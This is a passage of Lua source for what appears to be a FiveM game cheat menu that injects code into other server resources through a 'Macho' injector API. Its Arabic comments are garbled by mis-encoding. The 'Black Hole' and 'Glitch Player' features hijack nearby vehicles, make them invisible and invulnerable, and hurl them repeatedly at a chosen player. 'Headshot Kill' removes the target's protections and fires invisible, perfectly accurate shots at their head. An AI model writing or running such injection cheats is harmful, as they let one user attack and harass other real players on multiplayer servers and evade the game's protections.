                            SetEntityProofs(blackHoleVehicle, true, true, true, true, true, true, true, true)
                            SetVehicleStrong(blackHoleVehicle, true)
                            SetVehicleCanBeTargetted(blackHoleVehicle, false)
                            SetEntityCanBeDamagedByRelationshipGroup(blackHoleVehicle, false, 0)
                            
                            -- Ø¬Ø¹Ù„ Ø§Ù„ØµØ¯Ù…Ø§Øª ØµØ§Ù…ØªØ© Ø¹Ø¨Ø± Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„ÙÙŠØ²ÙŠØ§Ø¡
                            SetVehicleGravityAmount(blackHoleVehicle, 0.0)
                            SetEntityCollision(blackHoleVehicle, true, false) -- collision Ø¨Ø¯ÙˆÙ† Ø£ØµÙˆØ§Øª
                            SetEntityRecordsCollisions(blackHoleVehicle, false)
                            
                            -- Ù…Ù†Ø¹ Ø­Ø°Ù Ø§Ù„Ø³ÙŠØ§Ø±Ø©
                            SetEntityAsMissionEntity(blackHoleVehicle, true, true)
                            SetVehicleHasBeenOwnedByPlayer(blackHoleVehicle, true)
                            SetEntityAsNoLongerNeeded(blackHoleVehicle)
                            FreezeEntityPosition(blackHoleVehicle, false)
                            SetVehicleOnGroundProperly(blackHoleVehicle)
                            
                            -- Ø¬Ø¹Ù„ Ø§Ù„Ø³ÙŠØ§Ø±Ø© ØµØ§Ù…ØªØ© (Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø¯ÙˆØ§Ù„ Ø£Ø³Ø§Ø³ÙŠØ© ÙÙ‚Ø·)
                            SetVehicleEngineOn(blackHoleVehicle, true, true, false)
                            SetVehicleRadioEnabled(blackHoleVehicle, false)
                            SetVehicleLights(blackHoleVehicle, 0)
                            SetVehicleSiren(blackHoleVehicle, false)
                            -- Ø¥Ø²Ø§Ù„Ø© Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¯ÙˆØ§Ù„ ØºÙŠØ± Ø§Ù„Ù…ØªÙˆÙØ±Ø© ÙÙŠ FiveM
                            
                            -- Ø­Ù„Ù‚Ø© Ø§Ù„Ù€ Black Hole Ù…Ø¹ Ø§Ù„Ù†Ù‚Ù„ ÙˆØ§Ù„Ø¬Ø°Ø¨
                            while blackHoleActive and DoesEntityExist(blackHoleVehicle) do
                                local targetPed = GetPlayerPed(originalTargetPlayer)
                                
                                if DoesEntityExist(targetPed) then
                                    local targetPos = GetEntityCoords(targetPed)
                                    local vehiclePos = GetEntityCoords(blackHoleVehicle)
                                    local distance = #(targetPos - vehiclePos)
                                    
                                    -- Ø§Ù„ØªØ£ÙƒØ¯ Ù…Ù† Ø¨Ù‚Ø§Ø¡ Ø§Ù„Ø³ÙŠØ§Ø±Ø© Ù…Ø®ÙÙŠØ© ÙˆÙ…Ø­Ù…ÙŠØ©
                                    SetEntityVisible(blackHoleVehicle, false, false)
                                    SetEntityAlpha(blackHoleVehicle, 0, false)
                                    
                                    -- Ø¥Ø¹Ø§Ø¯Ø© ØªØ·Ø¨ÙŠÙ‚ Ø§Ù„Ø­Ù…Ø§ÙŠØ© Ø¨Ø§Ø³ØªÙ…Ø±Ø§Ø±
                                    SetEntityInvincible(blackHoleVehicle, true)
                                    SetEntityCanBeDamaged(blackHoleVehicle, false)
                                    SetEntityProofs(blackHoleVehicle, true, true, true, true, true, true, true, true)
                                    SetEntityAsMissionEntity(blackHoleVehicle, true, true)
                                    
                                    -- Ø§Ù„ØªØ£ÙƒØ¯ Ù…Ù† Ø¹Ø¯Ù… Ø§Ù„Ø­Ø°Ù
                                    if not DoesEntityExist(blackHoleVehicle) then
                                        break -- Ø¥Ø°Ø§ ØªÙ… Ø­Ø°Ù Ø§Ù„Ø³ÙŠØ§Ø±Ø©ØŒ Ø¥Ù†Ù‡Ø§Ø¡ Ø§Ù„Ø­Ù„Ù‚Ø©
                                    end
                                    
                                    -- Ù†Ø¸Ø§Ù… Ø§Ù„Ù†Ù‚Ù„ ÙˆØ§Ù„Ø¬Ø°Ø¨
                                    if teleportCooldown <= 0 then
                                        -- Ø§Ù„Ù…Ø±Ø­Ù„Ø© Ø§Ù„Ø£ÙˆÙ„Ù‰: Ù†Ù‚Ù„ Ø§Ù„Ø³ÙŠØ§Ø±Ø© ÙÙˆÙ‚ Ø§Ù„Ù‡Ø¯Ù (Ù„ÙŠØ³ ØªØ­ØªÙ‡)
                                        local teleportPos = vector3(targetPos.x, targetPos.y, targetPos.z + 10.0) -- ÙÙˆÙ‚ Ø§Ù„Ù‡Ø¯Ù Ø¨Ù€ 10 Ù…ØªØ±
                                        SetEntityCoordsNoOffset(blackHoleVehicle, teleportPos.x, teleportPos.y, teleportPos.z, false, false, false)
                                        SetEntityVelocity(blackHoleVehicle, 0.0, 0.0, 0.0)
                                        
                                        -- Ø¨Ø¯Ø¡ Ø¹Ø¯Ø§Ø¯ Ø§Ù„Ø¬Ø°Ø¨
                                        teleportCooldown = 15 -- 15 Ø¥Ø·Ø§Ø± Ù„Ù„Ø¬Ø°Ø¨ (Ø­ÙˆØ§Ù„ÙŠ 1.5 Ø«Ø§Ù†ÙŠØ©)
                                    else
                                        -- Ø§Ù„Ù…Ø±Ø­Ù„Ø© Ø§Ù„Ø«Ø§Ù†ÙŠØ©: Ø¬Ø°Ø¨ Ø§Ù„Ø³ÙŠØ§Ø±Ø© Ù†Ø­Ùˆ Ø§Ù„Ù‡Ø¯Ù Ø¨Ø³Ø±Ø¹Ø© Ø¹Ø§Ù„ÙŠØ©
                                        local currentVehiclePos = GetEntityCoords(blackHoleVehicle)
                                        local direction = targetPos - currentVehiclePos
                                        local normalizedDirection = direction / #direction
                                        
                                        -- Ù‚ÙˆØ© Ø¬Ø°Ø¨ Ø¹Ø§Ù„ÙŠØ© Ø¬Ø¯Ø§Ù‹
                                        local pullForce = 200.0
                                        local velocity = normalizedDirection * pullForce
                                        
                                        -- ØªØ·Ø¨ÙŠÙ‚ Ø§Ù„Ø³Ø±Ø¹Ø©
                                        SetEntityVelocity(blackHoleVehicle, velocity.x, velocity.y, velocity.z)
                                        
                                        -- ØªÙ‚Ù„ÙŠÙ„ Ø§Ù„Ø¹Ø¯Ø§Ø¯
                                        teleportCooldown = teleportCooldown - 1
                                        
                                        -- Ø¥Ø°Ø§ Ø§Ù†ØªÙ‡Ù‰ Ø§Ù„Ø¹Ø¯Ø§Ø¯ØŒ Ø¥Ø¹Ø§Ø¯Ø© ØªØ¹ÙŠÙŠÙ† Ù„Ù„Ù†Ù‚Ù„ Ù…Ø±Ø© Ø£Ø®Ø±Ù‰
                                        if teleportCooldown <= 0 then
                                            teleportCooldown = 0
                                        end
                                    end
                                else
                                    -- Ø¥Ø°Ø§ Ù„Ù… ÙŠÙˆØ¬Ø¯ Ø§Ù„Ù‡Ø¯ÙØŒ Ø§Ù†ØªØ¸Ø§Ø± ÙˆÙ„ÙƒÙ† Ø§Ø³ØªÙ…Ø±Ø§Ø± Ø§Ù„Ø­Ù„Ù‚Ø©
                                    Citizen.Wait(1000)
                                end
                                
                                Citizen.Wait(50) -- ØªØ­Ø¯ÙŠØ« ÙƒÙ„ 50 Ù…Ù„Ù„ÙŠ Ø«Ø§Ù†ÙŠØ© Ù„Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø³Ø±Ø¹Ø© Ø£Ø¹Ù„Ù‰
                            end
                            
                            -- ØªÙ†Ø¸ÙŠÙ Ø¹Ù†Ø¯ Ø¥Ù†Ù‡Ø§Ø¡ Ø§Ù„Ø­Ù„Ù‚Ø©
                            if DoesEntityExist(blackHoleVehicle) then
                                SetEntityAsMissionEntity(blackHoleVehicle, false, false)
                                DeleteEntity(blackHoleVehicle)
                            end
                        end
                    end)
                ]])
                MachoMenuNotification("Black Hole", "Black Hole activated on Player ID: " .. GetPlayerServerId(selectedPlayer))
            else
                MachoMenuNotification("Error", "Player not found")
            end
        else
            MachoMenuNotification("Error", "No player selected")
        end
    end,
    function()
        enableBlackHole = false
        MachoInjectResource("any", [[
            blackHoleActive = false
            blackHoleVehicle = nil
            teleportCooldown = 0
        ]])
        MachoMenuNotification("Black Hole", "Black Hole deactivated")
    end
)
MachoMenuCheckbox(PlayerSection, "Glitch Player", 
    function()
        enableBlackHole = true
        local selectedPlayer = MachoMenuGetSelectedPlayer()  
        if selectedPlayer and selectedPlayer ~= -1 then      
            local targetPed = GetPlayerPed(selectedPlayer)   
            if targetPed and DoesEntityExist(targetPed) then
                local originalTargetPlayer = selectedPlayer
                
                MachoInjectResource("any", [[
                    blackHoleActive = true
                    blackHoleVehicle = nil
                    originalTargetPlayer = ]] .. originalTargetPlayer .. [[
                    teleportCooldown = 0
                    
                    Citizen.CreateThread(function()
                        -- Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ø³ÙŠØ§Ø±Ø© ÙˆØ§Ø­Ø¯Ø© ÙÙ‚Ø·
                        while blackHoleActive and not blackHoleVehicle do
                            local targetPed = GetPlayerPed(originalTargetPlayer)
                            if DoesEntityExist(targetPed) then
                                local targetPos = GetEntityCoords(targetPed)
                                
                                -- Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ø£ÙˆÙ„ Ø³ÙŠØ§Ø±Ø© Ù…Ù†Ø§Ø³Ø¨Ø© ÙÙŠ Ù†Ø·Ø§Ù‚ 400 Ù…ØªØ±
                                local handle, vehicle = FindFirstVehicle()
                                local success
                                repeat
                                    if DoesEntityExist(vehicle) then
                                        local vehiclePos = GetEntityCoords(vehicle)
                                        local distance = #(targetPos - vehiclePos)
                                        
                                        if distance < 400.0 and distance > 2.0 then
                                            -- ÙØ­Øµ Ø§Ù„ØµÙ„Ø§Ø­ÙŠØ© Ø¹Ù„Ù‰ Ø§Ù„Ø³ÙŠØ§Ø±Ø©
                                            NetworkRequestControlOfEntity(vehicle)
                                            local hasControl = NetworkHasControlOfEntity(vehicle)
                                            
                                            if hasControl then
                                                -- Ø¹Ù†Ø¯Ù‡ ØµÙ„Ø§Ø­ÙŠØ© - Ø§Ø³ØªØ®Ø¯Ù… Ù‡Ø°Ù‡ Ø§Ù„Ø³ÙŠØ§Ø±Ø©
                                                blackHoleVehicle = vehicle
                                                break
                                            else
                                                -- Ù…Ø§Ø¹Ù†Ø¯Ù‡ ØµÙ„Ø§Ø­ÙŠØ© - ÙØ­Øµ Ø¥Ø°Ø§ Ø§Ù„Ø³ÙŠØ§Ø±Ø© ÙØ§Ø±ØºØ©
                                                local isVehicleEmpty = true
                                                local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(vehicle)) - 1
                                                
                                                for seat = -1, maxSeats do
                                                    local pedInSeat = GetPedInVehicleSeat(vehicle, seat)
                                                    if pedInSeat ~= 0 then
                                                        local playerId = NetworkGetPlayerIndexFromPed(pedInSeat)
                                                        if playerId ~= -1 then
                                                            isVehicleEmpty = false
                                                            break
                                                        end
                                                    end
                                                end
                                                
                                                if isVehicleEmpty then
                                                    -- Ø§Ù„Ø³ÙŠØ§Ø±Ø© ÙØ§Ø±ØºØ© - ÙˆØ§Ø±Ø¨ Ø³Ø±ÙŠØ¹ Ù„Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„ØªØ­ÙƒÙ…
                                                    local playerPed = PlayerPedId()
                                                    local originalPos = GetEntityCoords(playerPed)
                                                    local originalHeading = GetEntityHeading(playerPed)
                                                    
                                                    SetEntityVisible(playerPed, false, false)
                                                    ClearPedTasksImmediately(playerPed)
                                                    TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
                                                    ClearPedTasksImmediately(playerPed)
                                                    TaskLeaveVehicle(playerPed, vehicle, 0)
                                                    SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                                                    SetEntityHeading(playerPed, originalHeading)
                                                    SetEntityVisible(playerPed, true, false)
                                                    
                                                    -- Ø§Ù„Ø¢Ù† Ø§Ø³ØªØ®Ø¯Ù… Ù‡Ø°Ù‡ Ø§Ù„Ø³ÙŠØ§Ø±Ø©
                                                    blackHoleVehicle = vehicle
                                                    break
                                                end
                                            end
                                        end
                                    end
                                    success, vehicle = FindNextVehicle(handle)
                                until not success
                                EndFindVehicle(handle)
                            end
                            
                            Citizen.Wait(1000) -- Ø§Ù†ØªØ¸Ø§Ø± Ø«Ø§Ù†ÙŠØ© Ù‚Ø¨Ù„ Ø§Ù„Ø¨Ø­Ø« Ù…Ø±Ø© Ø£Ø®Ø±Ù‰
                        end
                        
                        -- Ø¥Ø°Ø§ ØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ Ø³ÙŠØ§Ø±Ø©ØŒ Ø§Ø¨Ø¯Ø£ Ø§Ù„Ù€ Black Hole
                        if blackHoleVehicle and DoesEntityExist(blackHoleVehicle) then
                            -- Ø¬Ø¹Ù„ Ø§Ù„Ø³ÙŠØ§Ø±Ø© Ù…Ø®ÙÙŠØ©
                            SetEntityVisible(blackHoleVehicle, false, false)
                            SetEntityAlpha(blackHoleVehicle, 0, false)
                            NetworkSetEntityInvisibleToNetwork(blackHoleVehicle, true)
                            
                            -- Ø¬Ø¹Ù„ Ø§Ù„Ø³ÙŠØ§Ø±Ø© ØºÙŠØ± Ù‚Ø§Ø¨Ù„Ø© Ù„Ù„ØªØ®Ø±ÙŠØ¨
                            SetEntityInvincible(blackHoleVehicle, true)
                            SetVehicleCanBreak(blackHoleVehicle, false)
                            SetVehicleCanBeVisiblyDamaged(blackHoleVehicle, false)
                            SetVehicleCanEngineOperateOnFire(blackHoleVehicle, true)
                            SetVehicleCanLeakOil(blackHoleVehicle, false)
                            SetVehicleCanLeakPetrol(blackHoleVehicle, false)
                            SetVehicleWheelsCanBreak(blackHoleVehicle, false)
                            SetVehicleWheelsCanBreakOffWhenBlowUp(blackHoleVehicle, false)
                            SetVehicleHasUnbreakableLights(blackHoleVehicle, true)
                            SetVehicleCanDeformWheels(blackHoleVehicle, false)
                            -- SetVehicleCanBeDamaged ØºÙŠØ± Ù…ØªÙˆÙØ± ÙÙŠ FiveM
                            SetEntityCanBeDamaged(blackHoleVehicle, false)
                            
                            -- Ù…Ù†Ø¹ Ø§Ù„ØªÙØ¬ÙŠØ± ÙˆØ§Ù„Ø§Ù†ÙØ¬Ø§Ø±
                            SetEntityProofs(blackHoleVehicle, true, true, true, true, true, true, true, true)
                            SetVehicleStrong(blackHoleVehicle, true)
                            SetVehicleCanBeTargetted(blackHoleVehicle, false)
                            SetEntityCanBeDamagedByRelationshipGroup(blackHoleVehicle, false, 0)
                            
                            -- Ø¬Ø¹Ù„ Ø§Ù„ØµØ¯Ù…Ø§Øª ØµØ§Ù…ØªØ© Ø¹Ø¨Ø± Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„ÙÙŠØ²ÙŠØ§Ø¡
                            SetVehicleGravityAmount(blackHoleVehicle, 0.0)
                            SetEntityCollision(blackHoleVehicle, true, false) -- collision Ø¨Ø¯ÙˆÙ† Ø£ØµÙˆØ§Øª
                            SetEntityRecordsCollisions(blackHoleVehicle, false)
                            
                            -- Ù…Ù†Ø¹ Ø­Ø°Ù Ø§Ù„Ø³ÙŠØ§Ø±Ø©
                            SetEntityAsMissionEntity(blackHoleVehicle, true, true)
                            SetVehicleHasBeenOwnedByPlayer(blackHoleVehicle, true)
                            SetEntityAsNoLongerNeeded(blackHoleVehicle)
                            FreezeEntityPosition(blackHoleVehicle, false)
                            SetVehicleOnGroundProperly(blackHoleVehicle)
                            
                            -- Ø¬Ø¹Ù„ Ø§Ù„Ø³ÙŠØ§Ø±Ø© ØµØ§Ù…ØªØ© (Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø¯ÙˆØ§Ù„ Ø£Ø³Ø§Ø³ÙŠØ© ÙÙ‚Ø·)
                            SetVehicleEngineOn(blackHoleVehicle, true, true, false)
                            SetVehicleRadioEnabled(blackHoleVehicle, false)
                            SetVehicleLights(blackHoleVehicle, 0)
                            SetVehicleSiren(blackHoleVehicle, false)
                            -- Ø¥Ø²Ø§Ù„Ø© Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¯ÙˆØ§Ù„ ØºÙŠØ± Ø§Ù„Ù…ØªÙˆÙØ±Ø© ÙÙŠ FiveM
                            
                            -- Ø­Ù„Ù‚Ø© Ø§Ù„Ù€ Black Hole Ù…Ø¹ Ø§Ù„Ù†Ù‚Ù„ ÙˆØ§Ù„Ø¬Ø°Ø¨
                            while blackHoleActive and DoesEntityExist(blackHoleVehicle) do
                                local targetPed = GetPlayerPed(originalTargetPlayer)
                                
                                if DoesEntityExist(targetPed) then
                                    local targetPos = GetEntityCoords(targetPed)
                                    local vehiclePos = GetEntityCoords(blackHoleVehicle)
                                    local distance = #(targetPos - vehiclePos)
                                    
                                    -- Ø§Ù„ØªØ£ÙƒØ¯ Ù…Ù† Ø¨Ù‚Ø§Ø¡ Ø§Ù„Ø³ÙŠØ§Ø±Ø© Ù…Ø®ÙÙŠØ© ÙˆÙ…Ø­Ù…ÙŠØ©
                                    SetEntityVisible(blackHoleVehicle, false, false)
                                    SetEntityAlpha(blackHoleVehicle, 0, false)
                                    
                                    -- Ø¥Ø¹Ø§Ø¯Ø© ØªØ·Ø¨ÙŠÙ‚ Ø§Ù„Ø­Ù…Ø§ÙŠØ© Ø¨Ø§Ø³ØªÙ…Ø±Ø§Ø±
                                    SetEntityInvincible(blackHoleVehicle, true)
                                    SetEntityCanBeDamaged(blackHoleVehicle, false)
                                    SetEntityProofs(blackHoleVehicle, true, true, true, true, true, true, true, true)
                                    SetEntityAsMissionEntity(blackHoleVehicle, true, true)
                                    
                                    -- Ø§Ù„ØªØ£ÙƒØ¯ Ù…Ù† Ø¹Ø¯Ù… Ø§Ù„Ø­Ø°Ù
                                    if not DoesEntityExist(blackHoleVehicle) then
                                        break -- Ø¥Ø°Ø§ ØªÙ… Ø­Ø°Ù Ø§Ù„Ø³ÙŠØ§Ø±Ø©ØŒ Ø¥Ù†Ù‡Ø§Ø¡ Ø§Ù„Ø­Ù„Ù‚Ø©
                                    end
                                    
                                    -- Ù†Ø¸Ø§Ù… Ø§Ù„Ù†Ù‚Ù„ ÙˆØ§Ù„Ø¬Ø°Ø¨ Ø§Ù„Ù…Ø­Ø³Ù†
                                    if teleportCooldown <= 0 then
                                        -- Ø§Ù„Ù…Ø±Ø­Ù„Ø© Ø§Ù„Ø£ÙˆÙ„Ù‰: Ù†Ù‚Ù„ Ø§Ù„Ø³ÙŠØ§Ø±Ø© ÙÙŠ Ù…ÙˆÙ‚Ø¹ Ø¹Ø´ÙˆØ§Ø¦ÙŠ Ø­ÙˆÙ„ Ø§Ù„Ù‡Ø¯Ù
                                        local randomOffset = math.random(15, 25) -- Ù…Ø³Ø§ÙØ© Ø¹Ø´ÙˆØ§Ø¦ÙŠØ© Ø¨ÙŠÙ† 15-25 Ù…ØªØ±
                                        local randomAngle = math.random() * 2 * math.pi -- Ø²Ø§ÙˆÙŠØ© Ø¹Ø´ÙˆØ§Ø¦ÙŠØ©
                                        
                                        local teleportPos = vector3(
                                            targetPos.x + math.cos(randomAngle) * randomOffset,
                                            targetPos.y + math.sin(randomAngle) * randomOffset,
                                            targetPos.z + math.random(5, 15) -- Ø§Ø±ØªÙØ§Ø¹ Ø¹Ø´ÙˆØ§Ø¦ÙŠ Ø¨ÙŠÙ† 5-15 Ù…ØªØ±
                                        )
                                        
                                        SetEntityCoordsNoOffset(blackHoleVehicle, teleportPos.x, teleportPos.y, teleportPos.z, false, false, false)
                                        SetEntityVelocity(blackHoleVehicle, 0.0, 0.0, 0.0)
                                        
                                        -- Ø¨Ø¯Ø¡ Ø¹Ø¯Ø§Ø¯ Ø§Ù„Ø¬Ø°Ø¨ - ÙˆÙ‚Øª Ø£Ø·ÙˆÙ„ Ù„Ù„Ø¬Ø°Ø¨
                                        teleportCooldown = 60 -- 60 Ø¥Ø·Ø§Ø± Ù„Ù„Ø¬Ø°Ø¨ (Ø­ÙˆØ§Ù„ÙŠ 4 Ø«ÙˆØ§Ù†)
                                    else
                                        -- Ø§Ù„Ù…Ø±Ø­Ù„Ø© Ø§Ù„Ø«Ø§Ù†ÙŠØ©: Ø¬Ø°Ø¨ Ø§Ù„Ø³ÙŠØ§Ø±Ø© Ù†Ø­Ùˆ Ø§Ù„Ù‡Ø¯Ù Ø¨Ø³Ø±Ø¹Ø© Ù…Ø¹ØªØ¯Ù„Ø©
                                        local currentVehiclePos = GetEntityCoords(blackHoleVehicle)
                                        local direction = targetPos - currentVehiclePos
                                        local distance = #direction
                                        
                                        if distance > 1.0 then -- ØªØ¬Ù†Ø¨ Ø§Ù„Ù‚Ø³Ù…Ø© Ø¹Ù„Ù‰ ØµÙØ±
                                            local normalizedDirection = direction / distance
                                            
                                            -- Ù‚ÙˆØ© Ø¬Ø°Ø¨ Ù…Ø¹ØªØ¯Ù„Ø© ØªØ²ÙŠØ¯ ÙƒÙ„Ù…Ø§ Ø§Ù‚ØªØ±Ø¨Øª Ø§Ù„Ø³ÙŠØ§Ø±Ø©
                                            local basePullForce = 25.0 -- Ù‚ÙˆØ© Ø£Ø³Ø§Ø³ÙŠØ© Ø£Ù‚Ù„
                                            local distanceMultiplier = math.max(0.5, 30.0 / distance) -- ØªØ²ÙŠØ¯ Ø§Ù„Ù‚ÙˆØ© Ù…Ø¹ Ø§Ù„Ù‚Ø±Ø¨
                                            local pullForce = basePullForce * distanceMultiplier
                                            
                                            local velocity = normalizedDirection * pullForce
                                            
                                            -- ØªØ·Ø¨ÙŠÙ‚ Ø§Ù„Ø³Ø±Ø¹Ø©
                                            SetEntityVelocity(blackHoleVehicle, velocity.x, velocity.y, velocity.z)
                                        end
                                        
                                        -- ØªÙ‚Ù„ÙŠÙ„ Ø§Ù„Ø¹Ø¯Ø§Ø¯
                                        teleportCooldown = teleportCooldown - 1
                                        
                                        -- Ø¥Ø°Ø§ Ø§Ù†ØªÙ‡Ù‰ Ø§Ù„Ø¹Ø¯Ø§Ø¯ØŒ Ø¥Ø¹Ø§Ø¯Ø© ØªØ¹ÙŠÙŠÙ† Ù„Ù„Ù†Ù‚Ù„ Ù…Ø±Ø© Ø£Ø®Ø±Ù‰
                                        if teleportCooldown <= 0 then
                                            teleportCooldown = 0
                                        end
                                    end
                                else
                                    -- Ø¥Ø°Ø§ Ù„Ù… ÙŠÙˆØ¬Ø¯ Ø§Ù„Ù‡Ø¯ÙØŒ Ø§Ù†ØªØ¸Ø§Ø± ÙˆÙ„ÙƒÙ† Ø§Ø³ØªÙ…Ø±Ø§Ø± Ø§Ù„Ø­Ù„Ù‚Ø©
                                    Citizen.Wait(1000)
                                end
                                
                                Citizen.Wait(100) -- ØªØ­Ø¯ÙŠØ« ÙƒÙ„ 100 Ù…Ù„Ù„ÙŠ Ø«Ø§Ù†ÙŠØ© Ù„Ø³Ø±Ø¹Ø© Ø£Ø¨Ø·Ø£
                            end
                            
                            -- ØªÙ†Ø¸ÙŠÙ Ø¹Ù†Ø¯ Ø¥Ù†Ù‡Ø§Ø¡ Ø§Ù„Ø­Ù„Ù‚Ø©
                            if DoesEntityExist(blackHoleVehicle) then
                                SetEntityAsMissionEntity(blackHoleVehicle, false, false)
                                DeleteEntity(blackHoleVehicle)
                            end
                        end
                    end)
                ]])
                MachoMenuNotification("Black Hole", "Black Hole activated on Player ID: " .. GetPlayerServerId(selectedPlayer))
            else
                MachoMenuNotification("Error", "Player not found")
            end
        else
            MachoMenuNotification("Error", "No player selected")
        end
    end,
    function()
        enableBlackHole = false
        MachoInjectResource("any", [[
            blackHoleActive = false
            blackHoleVehicle = nil
            teleportCooldown = 0
        ]])
        MachoMenuNotification("Black Hole", "Black Hole deactivated")
    end
)
MachoMenuButton(PlayerSection, "Headshot Kill", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()
    
    if not selectedPlayer then
        MachoMenuNotification("Error", "No player selected! Select a player from the list first.")
        return
    end
    
    local targetPed = GetPlayerPed(selectedPlayer)
    if not DoesEntityExist(targetPed) then
        MachoMenuNotification("Error", "Target player not found!")
        return
    end
    
    MachoInjectResource("any", [[
        Citizen.CreateThread(function()
            local targetPed = GetPlayerPed(]] .. selectedPlayer .. [[)
            local myPed = PlayerPedId()
            local currentWeapon = GetSelectedPedWeapon(myPed)
            
            -- Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø£Ù† Ø§Ù„Ù„Ø§Ø¹Ø¨ ÙŠØ­Ù…Ù„ Ø³Ù„Ø§Ø­
            if currentWeapon and currentWeapon ~= GetHashKey("weapon_unarmed") then
                if DoesEntityExist(targetPed) then
                    -- Ø¥Ø²Ø§Ù„Ø© Ø§Ù„Ø­Ù…Ø§ÙŠØ© Ù…Ù† Ø§Ù„Ù‡Ø¯Ù
                    SetEntityInvincible(targetPed, false)
                    SetEntityCanBeDamaged(targetPed, true)
                    SetEntityProofs(targetPed, false, false, false, false, false, false, false, false)
                    
                    -- Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø¥Ø­Ø¯Ø§Ø«ÙŠØ§Øª Ø§Ù„Ø±Ø£Ø³ Ø¨Ø·Ø±ÙŠÙ‚Ø© Ø£Ø¯Ù‚
                    local headBone = GetPedBoneIndex(targetPed, 31086)
                    local headCoords = GetWorldPositionOfEntityBone(targetPed, headBone)
                    
                    -- Ø¥Ø°Ø§ Ù„Ù… Ù†Ø­ØµÙ„ Ø¹Ù„Ù‰ Ø¥Ø­Ø¯Ø§Ø«ÙŠØ§Øª Ø§Ù„Ø±Ø£Ø³ØŒ Ø§Ø³ØªØ®Ø¯Ù… Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¹Ø§Ø¯ÙŠ Ù…Ø¹ Ø¥Ø¶Ø§ÙØ© Ø§Ø±ØªÙØ§Ø¹
                    if headCoords.x == 0.0 and headCoords.y == 0.0 and headCoords.z == 0.0 then
                        local targetPos = GetEntityCoords(targetPed)
                        headCoords = vector3(targetPos.x, targetPos.y, targetPos.z + 0.6)
                    end
                    
                    -- Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø¶Ø±Ø± Ø§Ù„Ø³Ù„Ø§Ø­ Ø§Ù„Ø­Ø§Ù„ÙŠ
                    local weaponDamage = GetWeaponDamage(currentWeapon, 0)
                    
                    -- Ø¥Ø²Ø§Ù„Ø© Ø§Ù„Ø§Ø±ØªØ¯Ø§Ø¯
                    SetWeaponRecoilShakeAmplitude(currentWeapon, 0.0)
                    SetPlayerWeaponDamageModifier(PlayerId(), 1.0)
                    
                    -- Ø§Ù„Ø·Ù„Ù‚Ø© Ø§Ù„Ø£ÙˆÙ„Ù‰ Ù…Ù† Ø¬Ø§Ù†Ø¨ Ø§Ù„Ø±Ø£Ø³ Ø§Ù„Ø£ÙŠÙ…Ù†
                    local shootPos1 = vector3(headCoords.x + 1.5, headCoords.y, headCoords.z)
                    ShootSingleBulletBetweenCoords(
                        shootPos1.x, shootPos1.y, shootPos1.z,
                        headCoords.x, headCoords.y, headCoords.z,
                        weaponDamage, -- Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø¶Ø±Ø± Ø§Ù„Ø³Ù„Ø§Ø­ Ø§Ù„Ø­Ø§Ù„ÙŠ
                        true, -- perfectAccuracy
                        currentWeapon, -- Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ø³Ù„Ø§Ø­ Ø§Ù„Ø­Ø§Ù„ÙŠ
                        myPed,
                        true, -- isAudible
                        true, -- isInvisible (Ù…Ø®ÙÙŠØ©)
                        3000.0 -- speed Ø¹Ø§Ù„ÙŠØ©
                    )
                    
                    Citizen.Wait(50) -- Ø§Ù†ØªØ¸Ø§Ø± Ù‚ØµÙŠØ± Ø¨ÙŠÙ† Ø§Ù„Ø·Ù„Ù‚ØªÙŠÙ†
                    
                    -- Ø§Ù„Ø·Ù„Ù‚Ø© Ø§Ù„Ø«Ø§Ù†ÙŠØ© Ù…Ù† Ø¬Ø§Ù†Ø¨ Ø§Ù„Ø±Ø£Ø³ Ø§Ù„Ø£ÙŠØ³Ø±
                    local shootPos2 = vector3(headCoords.x - 1.5, headCoords.y, headCoords.z)
                    ShootSingleBulletBetweenCoords(
                        shootPos2.x, shootPos2.y, shootPos2.z,
                        headCoords.x, headCoords.y, headCoords.z,
                        weaponDamage, -- Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø¶Ø±Ø± Ø§Ù„Ø³Ù„Ø§Ø­ Ø§Ù„Ø­Ø§Ù„ÙŠ
                        true, -- perfectAccuracy
                        currentWeapon, -- Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ø³Ù„Ø§Ø­ Ø§Ù„Ø­Ø§Ù„ÙŠ
                        myPed,
                        true, -- isAudible
                        true, -- isInvisible (Ù…Ø®ÙÙŠØ©)
                        3000.0 -- speed Ø¹Ø§Ù„ÙŠØ©
                    )
                else
                    -- Ø¥Ø´Ø¹Ø§Ø± Ø¥Ø°Ø§ Ù„Ù… ÙŠØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ Ø§Ù„Ù‡Ø¯Ù
                end
            else
                -- Ø¥Ø´Ø¹Ø§Ø± Ø¥Ø°Ø§ Ù„Ù… ÙŠÙƒÙ† ÙŠØ­Ù…Ù„ Ø³Ù„Ø§Ø­
            end
        end)
    ]])
    
    local targetName = GetPlayerName(selectedPlayer)
    MachoMenuNotification("Headshot", "Headshots fired at " .. targetName .. " using your current weapon")
end)

MachoMenuText(PlayerSection,"Vehicle Trolls")
-- Define DUI variables in a wider scope for accessibility
local menuDUI = nil
local menuVisible = false
local HELP_URL = "https://nitwit123.github.io/carauction/"

-- Use MachoMenuCheckbox with two callbacks: one for enabling, one for disabling.
MachoMenuCheckbox(PlayerSection, "Remote Car", 
